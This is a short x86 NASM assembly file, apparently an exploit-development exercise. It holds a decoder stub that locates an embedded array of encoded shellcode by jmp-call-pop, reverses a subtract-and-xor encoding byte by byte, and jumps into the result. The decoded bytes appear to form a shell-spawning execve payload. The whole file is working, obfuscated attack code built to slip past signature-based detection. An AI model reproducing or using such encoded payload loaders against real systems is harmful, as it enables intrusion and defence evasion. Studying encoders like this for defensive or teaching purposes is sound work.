; Filename: decoder.nasm
; Author:  Niels Muskens
; Purpose:  Decode encoded shellcode

global _start			

section .text
_start:

	jmp short call_shellcode 	; we use jmp call pop to determine address of EncodedShellcode



decoder:
	pop esi 			; Save addr of shellcode to esi
	xor ecx, ecx			; clear ecx
	mov cl, 28			; set counter to 28 (amount of bytes in shellcode)

decode:
	add byte[esi], 0x1		; decode the sub 1
	xor byte[esi], 0xff		; xor again with ff 
	inc esi				; inc for next iteration to go to next byte in shellcode
	loop decode			; do it again, and again, and again until cl == 0
	jmp short EncodedShellcode 	; when all is decoded execute decoded shellcode

call_shellcode:
	call decoder
	EncodedShellcode: db 0xcd,0x3e,0xae,0x96,0xcf,0xcf,0x8b,0x96,0x96,0xcf,0x9c,0x95,0x90,0x75,0x1b,0x75,0x3d,0x75,0x3c,0x4e,0xf3,0x31,0x7e,0xcd,0x3e,0xbe,0x31,0x7e


